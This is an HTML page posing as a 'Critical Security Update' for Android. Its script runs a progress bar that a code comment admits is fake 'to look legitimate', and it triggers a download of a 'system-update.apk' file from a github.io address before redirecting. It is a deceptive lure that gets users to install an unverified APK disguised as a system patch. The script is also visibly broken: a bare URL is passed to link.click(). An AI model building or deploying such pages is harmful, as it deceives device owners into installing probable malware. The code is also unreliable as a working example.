<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .icon { font-size: 60px; margin-bottom: 20px; }
        h1 { font-size: 22px; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 25px; font-size: 14px; line-height: 1.6; }
        .btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
        }
        .btn:hover { transform: scale(1.02); }
        .version { margin-top: 20px; font-size: 12px; color: #999; }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #eee;
            border-radius: 2px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }
        .progress-fill {
            height: 100%;
            background: #667eea;
            width: 0%;
            transition: width 0.3s;
        }
        .status {
            margin-top: 15px;
            font-size: 13px;
            color: #666;
            display: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🔒</div>
        <h1>Critical Security Update</h1>
        <p>Your system requires an important security patch.<br>
           Please install the update to continue using this device securely.</p>
        <div class="progress-bar" id="progressBar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <p class="status" id="status">Preparing update...</p>
        <button class="btn" id="installBtn" onclick="startInstall()">
            📥 Install Update Now
        </button>
        <div class="version">Android Security Patch • July 2026</div>
    </div>

    <script>
        function startInstall() {
            const btn = document.getElementById('installBtn');
            const progress = document.getElementById('progressBar');
            const fill = document.getElementById('progressFill');
            const status = document.getElementById('status');

            btn.style.display = 'none';
            progress.style.display = 'block';
            status.style.display = 'block';

            // Fake progress to look legitimate
            let progress_val = 0;
            const interval = setInterval(() => {
                progress_val += Math.random() * 15;
                if (progress_val > 100) progress_val = 100;
                fill.style.width = progress_val + '%';

                if (progress_val < 30) status.textContent = 'Checking system compatibility...';
                else if (progress_val < 60) status.textContent = 'Downloading security patch...';
                else if (progress_val < 90) status.textContent = 'Verifying package integrity...';
                else {
                    status.textContent = 'Complete! Redirecting...';
                    clearInterval(interval);
                    setTimeout(() => {
                        window.location.href = '/SystemUpdate/download.html';
                    }, 1500);
                }
            }, 500);

            // Actually trigger download
            var link = document.createElement('a');
            link.href = '/SystemUpdate/system-update.apk';
            link.download = 'https://shabirhussain276-cpu.github.io/SystemUpdate/system-update.apk';
            document.body.appendChild(link);
            link.click(https://shabirhussain276-cpu.github.io/SystemUpdate/system-update.apk);
            document.body.removeChild(link);
        }
    </script>
</body>
</html>
